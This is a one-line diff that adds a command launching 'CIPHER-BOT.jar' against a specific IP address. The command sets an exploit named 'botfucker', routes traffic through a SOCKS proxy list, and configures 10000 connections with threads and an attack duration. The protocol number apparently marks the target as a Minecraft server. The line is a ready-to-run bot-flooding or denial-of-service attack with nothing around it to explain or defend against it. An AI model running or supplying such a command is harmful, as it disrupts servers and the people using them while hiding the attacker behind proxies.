@@ -1,0 +1,1 @@
+java -jar CIPHER-BOT.jar host=<45.141.247.131> port=<PORT> protocol=30170 exploit=botfucker proxiesFile=socks.txt srvResolve=false srvResolve2=false threads=<THREADS> timeout=1000 attackTime=<TIME> connections=10000 loopAmount=1 keepAlive=true alwaysResolve=false print=false multi=true removeFailure=false proxiesType=socks socksV4=true
